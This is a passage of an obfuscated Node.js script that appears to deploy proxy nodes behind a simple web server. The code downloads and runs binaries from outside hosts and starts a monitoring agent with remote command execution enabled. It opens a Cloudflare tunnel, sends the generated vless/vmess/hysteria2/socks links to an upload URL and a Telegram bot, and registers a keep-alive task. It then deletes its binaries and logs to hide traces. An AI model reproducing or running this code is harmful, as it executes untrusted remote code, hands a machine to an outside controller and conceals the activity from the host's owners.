    console[_0x3cf65e(0x12d)](_0x3cf65e(0x116))
    return
  }
  const _0x4b32bc = _0x11b60e['map']((_0xac46a5) => {
    return new Promise((_0x5f143a, _0x3a8d01) => {
      const _0x12e9e8 = (_0x25ed7a) => {
        const _0x4b5386 = _0x60c6
        downloadFile(_0xac46a5['fileName'], _0xac46a5[_0x4b5386(0x1ce)][_0x25ed7a], (_0x51ee05, _0x1e2e5c) => {
          const _0x2f6c3f = _0x4b5386
          if (!_0x51ee05) {
            _0x5f143a(_0x1e2e5c)
            return
          }
          if (_0x25ed7a + 0x1 < _0xac46a5[_0x2f6c3f(0x1ce)][_0x2f6c3f(0x1c2)]) {
            ;(console[_0x2f6c3f(0x12d)](_0x2f6c3f(0x175) + path[_0x2f6c3f(0x1b2)](_0xac46a5[_0x2f6c3f(0x16c)]) + _0x2f6c3f(0x15f)),
              _0x12e9e8(_0x25ed7a + 0x1))
            return
          }
          _0x3a8d01(_0x51ee05)
        })
      }
      _0x12e9e8(0x0)
    })
  })
  try {
    await Promise[_0x3cf65e(0x17c)](_0x4b32bc)
  } catch (_0x36eafd) {
    console[_0x3cf65e(0xd1)](_0x3cf65e(0x13c), _0x36eafd)
    return
  }
  function _0x514cf3(_0xe8831) {
    const _0x71c21e = _0x3cf65e,
      _0x5d331a = 0x1fd
    _0xe8831[_0x71c21e(0x12f)]((_0x4b1132) => {
      const _0x2f809d = _0x71c21e
      if (fs[_0x2f809d(0x16a)](_0x4b1132))
        try {
          ;(fs['chmodSync'](_0x4b1132, _0x5d331a),
            console[_0x2f809d(0x12d)](_0x2f809d(0x1ca) + _0x4b1132 + ':\x20' + _0x5d331a[_0x2f809d(0xe4)](0x8)))
        } catch (_0xc6f02a) {
          console[_0x2f809d(0xd1)]('Empowerment\x20failed\x20for\x20' + _0x4b1132 + ':\x20' + _0xc6f02a)
        }
    })
  }
  const _0x9d16b3 = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath]
  _0x514cf3(_0x9d16b3)
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const _0x112662 = NEZHA_SERVER[_0x3cf65e(0x100)](':') ? NEZHA_SERVER[_0x3cf65e(0x1e9)](':')['pop']() : '',
        _0x2ed09f = new Set(['443', '8443', '2096', _0x3cf65e(0xed), '2083', _0x3cf65e(0xf7)]),
        _0x3e0bc7 = _0x2ed09f[_0x3cf65e(0x10f)](_0x112662) ? _0x3cf65e(0x1ea) : _0x3cf65e(0x1c5),
        _0x5ee899 =
          '\x0aclient_secret:\x20' +
          NEZHA_KEY +
          '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20' +
          NEZHA_SERVER +
          _0x3cf65e(0xd7) +
          _0x3e0bc7 +
          _0x3cf65e(0xf5) +
          UUID
      fs['writeFileSync'](path[_0x3cf65e(0x1b9)](FILE_PATH, _0x3cf65e(0x164)), _0x5ee899)
      const _0x168c82 = _0x3cf65e(0xe5) + phpPath + '\x20-c\x20\x22' + FILE_PATH + _0x3cf65e(0x1ef)
      try {
        ;(await exec(_0x168c82),
          console[_0x3cf65e(0x12d)](phpName + _0x3cf65e(0x1c1)),
          await new Promise((_0x386098) => setTimeout(_0x386098, 0x3e8)))
      } catch (_0x5ef31) {
        console[_0x3cf65e(0xd1)](_0x3cf65e(0x17f) + _0x5ef31)
      }
    } else {
      let _0x42afb3 = ''
      const _0x113074 = ['443', _0x3cf65e(0x10e), _0x3cf65e(0x18e), _0x3cf65e(0xed), _0x3cf65e(0xd6), _0x3cf65e(0xf7)]
      _0x113074[_0x3cf65e(0x100)](NEZHA_PORT) && (_0x42afb3 = _0x3cf65e(0x160))
      const _0x3b4595 =
        _0x3cf65e(0xe5) +
        npmPath +
        _0x3cf65e(0x11a) +
        NEZHA_SERVER +
        ':' +
        NEZHA_PORT +
        _0x3cf65e(0x1a7) +
        NEZHA_KEY +
        '\x20' +
        _0x42afb3 +
        _0x3cf65e(0x151)
      try {
        ;(await exec(_0x3b4595),
          console[_0x3cf65e(0x12d)](npmName + _0x3cf65e(0x1c1)),
          await new Promise((_0x1d34b7) => setTimeout(_0x1d34b7, 0x3e8)))
      } catch (_0xe33ee5) {
        console['error'](_0x3cf65e(0x11f) + _0xe33ee5)
      }
    }
  } else console[_0x3cf65e(0x12d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running')
  const _0x4fb381 = 'nohup\x20' + webPath + '\x20-c\x20' + FILE_PATH + _0x3cf65e(0x1cb)
  try {
    ;(await exec(_0x4fb381), console[_0x3cf65e(0x12d)](webName + _0x3cf65e(0x1c1)), await new Promise((_0x1d56f0) => setTimeout(_0x1d56f0, 0x3e8)))
  } catch (_0x3a9351) {
    console[_0x3cf65e(0xd1)](_0x3cf65e(0x162) + _0x3a9351)
  }
  if (fs[_0x3cf65e(0x16a)](botPath)) {
    let _0x369816
    if (ARGO_AUTH[_0x3cf65e(0x153)](/^[A-Z0-9a-z=]{120,250}$/))
      _0x369816 = 'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20' + ARGO_AUTH
    else
      ARGO_AUTH['match'](/TunnelSecret/)
        ? (_0x369816 = _0x3cf65e(0xe7) + path['resolve'](FILE_PATH, _0x3cf65e(0x14a)) + _0x3cf65e(0x1db))
        : (_0x369816 = _0x3cf65e(0x17b) + path[_0x3cf65e(0x14c)](bootLogPath) + _0x3cf65e(0x10b) + ARGO_PORT)
    try {
      ;(await exec(_0x3cf65e(0x1e8) + path[_0x3cf65e(0x14c)](botPath) + '\x22\x20' + _0x369816 + '\x20>/dev/null\x202>&1\x20&'),
        console[_0x3cf65e(0x12d)](botName + _0x3cf65e(0x1c1)),
        await new Promise((_0x398dc5) => setTimeout(_0x398dc5, 0x7d0)))
    } catch (_0x366a54) {
      console[_0x3cf65e(0xd1)](_0x3cf65e(0x196) + _0x366a54)
    }
  }
  await new Promise((_0x149201) => setTimeout(_0x149201, 0x1388))
}
function getFilesForArchitecture(_0x5271bc) {
  const _0x5725be = _0x3e3e40,
    _0x559760 = _0x5271bc === _0x5725be(0x1a5) ? _0x5725be(0x1ad) : 'https://amd64.oooen.com',
    _0x75d9b7 = _0x5271bc === _0x5725be(0x1a5) ? 'https://arm64.ssss.nyc.mn' : _0x5725be(0x15d),
    _0x2c2ece = [
      { fileName: webPath, fileUrls: [_0x559760 + _0x5725be(0x12c), _0x75d9b7 + _0x5725be(0x12c)] },
      { fileName: botPath, fileUrls: [_0x559760 + _0x5725be(0x16f), _0x75d9b7 + _0x5725be(0x16f)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0x2c2ece[_0x5725be(0x120)]({ fileName: npmPath, fileUrls: [_0x559760 + '/agent', _0x75d9b7 + _0x5725be(0x1f0)] })
        : _0x2c2ece[_0x5725be(0x120)]({ fileName: phpPath, fileUrls: [_0x559760 + '/v1', _0x75d9b7 + _0x5725be(0x136)] })),
    _0x2c2ece
  )
}
function argoType() {
  const _0x122ae5 = _0x3e3e40
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console['log'](_0x122ae5(0x1b5))
    return
  }
  if (ARGO_AUTH[_0x122ae5(0x100)](_0x122ae5(0x1c0))) {
    fs['writeFileSync'](path[_0x122ae5(0x1b9)](FILE_PATH, _0x122ae5(0x130)), ARGO_AUTH)
    const _0x3ea11a =
      '\x0a\x20\x20tunnel:\x20' +
      ARGO_AUTH[_0x122ae5(0x1e9)]('\x22')[0xb] +
      _0x122ae5(0xe8) +
      path[_0x122ae5(0x1b9)](FILE_PATH, 'tunnel.json') +
      '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20' +
      ARGO_DOMAIN +
      _0x122ae5(0x1bb) +
      ARGO_PORT +
      _0x122ae5(0x1d4)
    fs[_0x122ae5(0x19c)](path[_0x122ae5(0x1b9)](FILE_PATH, _0x122ae5(0x14a)), _0x3ea11a)
  } else console[_0x122ae5(0x12d)](_0x122ae5(0xd8) + ARGO_PORT + '\x20in\x20clouudflare')
}
async function waitForQuickTunnelLog(_0x36661d = 0x7530) {
  const _0x4350ad = _0x3e3e40,
    _0x2e891f = Date[_0x4350ad(0x159)]() + _0x36661d
  while (Date[_0x4350ad(0x159)]() < _0x2e891f) {
    try {
      if (fs[_0x4350ad(0x16a)](bootLogPath)) {
        const _0x1c1eaa = fs[_0x4350ad(0x186)](bootLogPath, _0x4350ad(0x142))
        if (/trycloudflare\.com/[_0x4350ad(0xfc)](_0x1c1eaa)) return _0x1c1eaa
      }
    } catch (_0x2747e4) {}
    await new Promise((_0x312d78) => setTimeout(_0x312d78, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0x342f63 = _0x3e3e40
  let _0x2ee203
  if (ARGO_AUTH && ARGO_DOMAIN) ((_0x2ee203 = ARGO_DOMAIN), console[_0x342f63(0x12d)](_0x342f63(0x1c8), _0x2ee203), await generateLinks(_0x2ee203))
  else
    try {
      const _0x584caf = await waitForQuickTunnelLog(),
        _0x27bbb6 = _0x584caf[_0x342f63(0x1e9)]('\x0a'),
        _0x38e1bf = []
      _0x27bbb6[_0x342f63(0x12f)]((_0x48d37f) => {
        const _0x32f724 = _0x342f63,
          _0x26f093 = _0x48d37f[_0x32f724(0x153)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x26f093) {
          const _0x162e82 = _0x26f093[0x1]
          _0x38e1bf[_0x32f724(0x141)](_0x162e82)
        }
      })
      if (_0x38e1bf[_0x342f63(0x1c2)] > 0x0) ((_0x2ee203 = _0x38e1bf[0x0]), console['log']('ArgoDomain:', _0x2ee203), await generateLinks(_0x2ee203))
      else {
        ;(console[_0x342f63(0x12d)](_0x342f63(0x1c9)), fs[_0x342f63(0x1bf)](path[_0x342f63(0x1b9)](FILE_PATH, _0x342f63(0x1b6))))
        async function _0x2bb677() {
          const _0x9872bc = _0x342f63
          try {
            process['platform'] === _0x9872bc(0x150)
              ? await exec(_0x9872bc(0xe9) + botName + _0x9872bc(0x143))
              : await exec(_0x9872bc(0x137) + botName[_0x9872bc(0x1ec)](0x0) + ']' + botName['substring'](0x1) + _0x9872bc(0x1b4))
          } catch (_0x458cd5) {}
        }
        ;(_0x2bb677(), await new Promise((_0x16c31d) => setTimeout(_0x16c31d, 0xbb8)))
        const _0x163114 = _0x342f63(0x17b) + path[_0x342f63(0x14c)](bootLogPath) + _0x342f63(0x10b) + ARGO_PORT
        try {
          ;(await exec(_0x342f63(0x1e8) + path[_0x342f63(0x14c)](botPath) + '\x22\x20' + _0x163114 + _0x342f63(0x149)),
            console[_0x342f63(0x12d)](botName + _0x342f63(0x1c1)),
            await new Promise((_0x117924) => setTimeout(_0x117924, 0x1770)),
            await extractDomains())
        } catch (_0x263b2e) {
          console[_0x342f63(0xd1)](_0x342f63(0x196) + _0x263b2e)
        }
      }
    } catch (_0x5360c3) {
      console[_0x342f63(0xd1)]('Error\x20reading\x20boot.log:', _0x5360c3)
    }
}
async function getMetaInfo() {
  const _0x3ff54b = _0x3e3e40
  try {
    const _0x1935ab = await axios[_0x3ff54b(0x11d)](_0x3ff54b(0x191), { headers: { 'User-Agent': _0x3ff54b(0x165), timeout: 0xbb8 } })
    if (_0x1935ab[_0x3ff54b(0x1a2)] && _0x1935ab[_0x3ff54b(0x1a2)][_0x3ff54b(0x1a6)] && _0x1935ab[_0x3ff54b(0x1a2)]['isp'])
      return (_0x1935ab[_0x3ff54b(0x1a2)][_0x3ff54b(0x1a6)] + '-' + _0x1935ab['data']['isp'])[_0x3ff54b(0x155)](/\s+/g, '_')
  } catch (_0x408915) {
    try {
      const _0x37bd48 = await axios[_0x3ff54b(0x11d)](_0x3ff54b(0x1d2), { headers: { 'User-Agent': _0x3ff54b(0x165), timeout: 0xbb8 } })
      if (
        _0x37bd48[_0x3ff54b(0x1a2)] &&
        _0x37bd48[_0x3ff54b(0x1a2)][_0x3ff54b(0x1ac)] === _0x3ff54b(0x1a1) &&
        _0x37bd48[_0x3ff54b(0x1a2)]['countryCode'] &&
        _0x37bd48[_0x3ff54b(0x1a2)][_0x3ff54b(0x15c)]
      )
        return (_0x37bd48['data']['countryCode'] + '-' + _0x37bd48[_0x3ff54b(0x1a2)][_0x3ff54b(0x15c)])[_0x3ff54b(0x155)](/\s+/g, '_')
    } catch (_0x40aa04) {}
  }
  return _0x3ff54b(0x17e)
}
async function getServerIP() {
  const _0x495a19 = _0x3e3e40
  let _0x1d317 = ''
  try {
    const _0x40e041 = await axios['get'](_0x495a19(0x146), { timeout: 0xbb8 })
    _0x1d317 = _0x40e041[_0x495a19(0x1a2)][_0x495a19(0x115)]()
  } catch (_0x1cb216) {
    try {
      _0x1d317 = execSync(_0x495a19(0x19f))[_0x495a19(0xe4)]()[_0x495a19(0x115)]()
    } catch (_0x5f0138) {
      try {
        const _0x28b6cc = await axios['get'](_0x495a19(0x18d), { timeout: 0xbb8 })
        _0x1d317 = '[' + _0x28b6cc[_0x495a19(0x1a2)][_0x495a19(0x115)]() + ']'
      } catch (_0x564ec1) {
        try {
          _0x1d317 = '[' + execSync('curl\x20-sm\x203\x20ipv6.ip.sb')[_0x495a19(0xe4)]()[_0x495a19(0x115)]() + ']'
        } catch (_0x44ae38) {
          console[_0x495a19(0xd1)](_0x495a19(0x14e), _0x44ae38[_0x495a19(0x14b)])
        }
      }
    }
  }
  return _0x1d317
}
async function generateLinks(_0x34b01f) {
  const _0x435b93 = await getMetaInfo(),
    _0x58b121 = NAME ? NAME + '-' + _0x435b93 : _0x435b93,
    _0x14c8a0 = await getServerIP()
  return new Promise((_0x35b103) => {
    setTimeout(() => {
      const _0x34b469 = _0x60c6,
        _0x55329a = {
          v: '2',
          ps: '' + _0x58b121,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: _0x34b469(0xd4),
          net: 'ws',
          type: _0x34b469(0xdc),
          host: _0x34b01f,
          path: _0x34b469(0x1ee),
          tls: _0x34b469(0x1e4),
          sni: _0x34b01f,
          alpn: '',
          fp: _0x34b469(0xef)
        }
      let _0x691f38 =
        _0x34b469(0x1dd) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x34b469(0x118) +
        _0x34b01f +
        _0x34b469(0x111) +
        _0x34b01f +
        _0x34b469(0x193) +
        _0x58b121 +
        '\x0a\x0avmess://' +
        Buffer[_0x34b469(0xdf)](JSON['stringify'](_0x55329a))[_0x34b469(0xe4)]('base64') +
        _0x34b469(0x1af) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x34b469(0xe6) +
        _0x34b01f +
        _0x34b469(0x111) +
        _0x34b01f +
        _0x34b469(0x1b0) +
        _0x58b121 +
        _0x34b469(0x107)
      if (isValidPort(HY2_PORT)) {
        const _0x72bfff = getCertificateFingerprint(certPath),
          _0x107f7c = _0x72bfff ? _0x34b469(0x148) + encodeURIComponent(_0x72bfff) : '',
          _0x1c7df1 = '\x0ahysteria2://' + UUID + '@' + _0x14c8a0 + ':' + HY2_PORT + _0x34b469(0x11c) + _0x107f7c + '#' + _0x58b121
        _0x691f38 += _0x1c7df1
      }
      if (isValidPort(REALITY_PORT)) {
        const _0xeec02 = _0x34b469(0x1dd) + UUID + '@' + _0x14c8a0 + ':' + REALITY_PORT + _0x34b469(0x195) + publicKey + _0x34b469(0x18b) + _0x58b121
        _0x691f38 += _0xeec02
      }
      if (isValidPort(S5_PORT)) {
        const _0x20e945 = Buffer[_0x34b469(0xdf)](UUID[_0x34b469(0x10a)](0x0, 0x8) + ':' + UUID[_0x34b469(0x1c7)](-0xc))[_0x34b469(0xe4)](
            _0x34b469(0x125)
          ),
          _0x46267c = _0x34b469(0x199) + _0x20e945 + '@' + _0x14c8a0 + ':' + S5_PORT + '#' + _0x58b121
        _0x691f38 += _0x46267c
      }
      ;(console['log'](Buffer[_0x34b469(0xdf)](_0x691f38)[_0x34b469(0xe4)]('base64')),
        fs[_0x34b469(0x19c)](subPath, Buffer['from'](_0x691f38)[_0x34b469(0xe4)](_0x34b469(0x125))),
        fs['writeFileSync'](listPath, _0x691f38, _0x34b469(0x1c4)),
        console[_0x34b469(0x12d)](FILE_PATH + _0x34b469(0xde)),
        (subContent = Buffer[_0x34b469(0xdf)](_0x691f38)[_0x34b469(0xe4)](_0x34b469(0x125))),
        uploadNodes(),
        _0x35b103(_0x691f38))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x188c14 = _0x3e3e40
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x3e5430 = PROJECT_URL + '/' + SUB_PATH,
      _0x2c8c54 = { subscription: [_0x3e5430] }
    try {
      const _0x5b7a14 = await axios[_0x188c14(0x168)](UPLOAD_URL + _0x188c14(0x1e3), _0x2c8c54, { headers: { 'Content-Type': _0x188c14(0x1f4) } })
      return _0x5b7a14 && _0x5b7a14[_0x188c14(0x1ac)] === 0xc8 ? (console[_0x188c14(0x12d)](_0x188c14(0xf4)), _0x5b7a14) : null
    } catch (_0x2f2ac4) {
      if (_0x2f2ac4[_0x188c14(0xf2)]) {
        if (_0x2f2ac4[_0x188c14(0xf2)][_0x188c14(0x1ac)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs['existsSync'](listPath)) return
      const _0x350d10 = fs[_0x188c14(0x186)](listPath, _0x188c14(0x142)),
        _0x1da3e3 = _0x350d10[_0x188c14(0x1e9)]('\x0a')[_0x188c14(0x1f3)]((_0x3c5644) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x188c14(0xfc)](_0x3c5644)
        )
      if (_0x1da3e3[_0x188c14(0x1c2)] === 0x0) return
      const _0x21f232 = JSON[_0x188c14(0x109)]({ nodes: _0x1da3e3 })
      try {
        const _0xfe4d9 = await axios[_0x188c14(0x168)](UPLOAD_URL + _0x188c14(0x17a), _0x21f232, { headers: { 'Content-Type': _0x188c14(0x1f4) } })
        return _0xfe4d9 && _0xfe4d9[_0x188c14(0x1ac)] === 0xc8 ? (console[_0x188c14(0x12d)]('Nodes\x20uploaded\x20successfully'), _0xfe4d9) : null
      } catch (_0x5d3130) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  setTimeout(() => {
    const _0x5e941e = _0x60c6,
      _0x2ad3b5 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x2ad3b5[_0x5e941e(0x141)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x2ad3b5[_0x5e941e(0x141)](phpPath)
    process[_0x5e941e(0xff)] === 'win32'
      ? exec('del\x20/f\x20/q\x20' + _0x2ad3b5[_0x5e941e(0x1b9)]('\x20') + '\x20>\x20nul\x202>&1', (_0x23d3e2) => {
          const _0x37b509 = _0x5e941e
          ;(console[_0x37b509(0x181)](),
            alwaysLog('App\x20is\x20running'),
            console[_0x37b509(0x12d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!'))
        })
      : exec(_0x5e941e(0x1e6) + _0x2ad3b5[_0x5e941e(0x1b9)]('\x20') + _0x5e941e(0x179), (_0x413cf6) => {
          const _0x2f48b2 = _0x5e941e
          ;(console[_0x2f48b2(0x181)](), alwaysLog(_0x2f48b2(0x1d5)), console[_0x2f48b2(0x12d)](_0x2f48b2(0x113)))
        })
  }, 0x15f90)
}
cleanFiles()
async function sendTelegram() {
  const _0x51e3e1 = _0x3e3e40
  if (!BOT_TOKEN || !CHAT_ID) {
    console[_0x51e3e1(0x12d)](_0x51e3e1(0x1f1))
    return
  }
  try {
    const _0x4f4d0e = fs[_0x51e3e1(0x186)](subPath, 'utf8'),
      _0x5a2b88 = _0x51e3e1(0x10c) + BOT_TOKEN + '/sendMessage',
      _0x4fde43 = NAME[_0x51e3e1(0x155)](/[_*\[\]()~`>#+=|{}.!-]/g, _0x51e3e1(0x15b)),
      _0x3e3093 = { chat_id: CHAT_ID, text: '**' + _0x4fde43 + _0x51e3e1(0xea) + _0x4f4d0e + '```', parse_mode: _0x51e3e1(0x185) }
    ;(await axios[_0x51e3e1(0x168)](_0x5a2b88, null, { params: _0x3e3093 }), console[_0x51e3e1(0x12d)](_0x51e3e1(0x16d)))
  } catch (_0x211ef5) {
    console[_0x51e3e1(0xd1)](_0x51e3e1(0x167), _0x211ef5['message'])
  }
}
async function AddVisitTask() {
  const _0x12317b = _0x3e3e40
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console['log']('Skipping\x20adding\x20automatic\x20access\x20task')
    return
  }
  try {
    const _0x2c4582 = await axios[_0x12317b(0x168)](
      'https://oooo.serv00.net/add-url',
      { url: PROJECT_URL },
      { headers: { 'Content-Type': 'application/json' } }
    )
    return (console[_0x12317b(0x12d)](_0x12317b(0x13d)), _0x2c4582)
  } catch (_0x27e29a) {
    return (console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20' + _0x27e29a[_0x12317b(0x14b)]), null)
  }
}
async function startserver() {
  const _0x1573e0 = _0x3e3e40
  try {
    ;(argoType(),
      deleteNodes(),
      cleanupOldFiles(),
      isValidPort(REALITY_PORT) && generateOrLoadKeyPair(),
      isValidPort(HY2_PORT) && ensureTlsCertificates(certPath, keyPath),
      await generateConfig(),
      await downloadFilesAndRun(),
      await extractDomains(),
      await sendTelegram(),
      await AddVisitTask())
  } catch (_0x357c24) {
    console[_0x1573e0(0xd1)](_0x1573e0(0x1a9), _0x357c24)
  }
}
startserver()['catch']((_0x32a055) => {
  const _0x4f7940 = _0x3e3e40
  console['error'](_0x4f7940(0x163), _0x32a055)
})
const server = http[_0x3e3e40(0x106)](async (_0x23bc57, _0x3f809b) => {
  const _0x63bd7f = _0x3e3e40,
    _0x8bf8b3 = _0x23bc57[_0x63bd7f(0x12b)][_0x63bd7f(0x1e9)]('?')[0x0]
  if (_0x8bf8b3 === '/' + SUB_PATH) {
    if (subContent) (_0x3f809b['writeHead'](0xc8, { 'Content-Type': 'text/plain;\x20charset=utf-8' }), _0x3f809b[_0x63bd7f(0x13b)](subContent))
    else
      try {
        const _0x21962f = fs['readFileSync'](subPath, _0x63bd7f(0x142))
        ;(_0x3f809b[_0x63bd7f(0x1d6)](0xc8, { 'Content-Type': _0x63bd7f(0x174) }), _0x3f809b[_0x63bd7f(0x13b)](_0x21962f))
      } catch (_0x612f7d) {
        ;(_0x3f809b[_0x63bd7f(0x1d6)](0x1f7, { 'Content-Type': _0x63bd7f(0x174) }), _0x3f809b[_0x63bd7f(0x13b)](_0x63bd7f(0x184)))
      }
    return
  }
  if (_0x8bf8b3 === '/') {
    try {
      const _0x2e92f3 = path[_0x63bd7f(0x1b9)](__dirname, _0x63bd7f(0x114)),
        _0x3f2e98 = await fs['promises']['readFile'](_0x2e92f3, _0x63bd7f(0x1c4))
      ;(_0x3f809b[_0x63bd7f(0x1d6)](0xc8, { 'Content-Type': _0x63bd7f(0xfe) }), _0x3f809b[_0x63bd7f(0x13b)](_0x3f2e98))
    } catch (_0x1363e2) {
      ;(_0x3f809b[_0x63bd7f(0x1d6)](0xc8, { 'Content-Type': _0x63bd7f(0xfe) }), _0x3f809b[_0x63bd7f(0x13b)](_0x63bd7f(0x15a)))
    }
    return
  }
  ;(_0x3f809b[_0x63bd7f(0x1d6)](0x194, { 'Content-Type': 'text/plain;\x20charset=utf-8' }), _0x3f809b[_0x63bd7f(0x13b)](_0x63bd7f(0x1a8)))
})
server[_0x3e3e40(0x1b8)](PORT, () => alwaysLog(_0x3e3e40(0x133) + PORT + '!'))
